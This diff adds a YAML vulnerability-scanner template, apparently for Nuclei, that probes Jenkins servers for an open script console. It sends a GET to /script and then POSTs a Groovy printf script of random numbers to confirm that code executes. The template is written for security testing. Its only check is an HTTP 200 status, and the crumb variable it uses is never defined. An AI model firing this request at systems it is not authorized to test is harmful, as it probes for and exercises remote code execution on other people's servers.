@@ -1,0 +1,36 @@
+id: poc-yaml-jenkins-unauthorized-access
+
+info:
+  name: poc-yaml-jenkins-unauthorized-access
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  severity: critical
+  tags: xray-converted,unauth,ct-158106
+  reference:
+    - https://www.cnblogs.com/yuzly/p/11255609.html
+    - https://blog.51cto.com/13770310/2156663
+
+http:
+  - raw:
+      - |
+        GET /script HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /script HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        script=printf%28%27{{rand_int(1000, 9999)}}%25%25{{rand_int(1000, 9999)}}%27%29%3B&Jenkins-Crumb={{var}}&Submit=%E8%BF%90%E8%A1%8C
+        
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
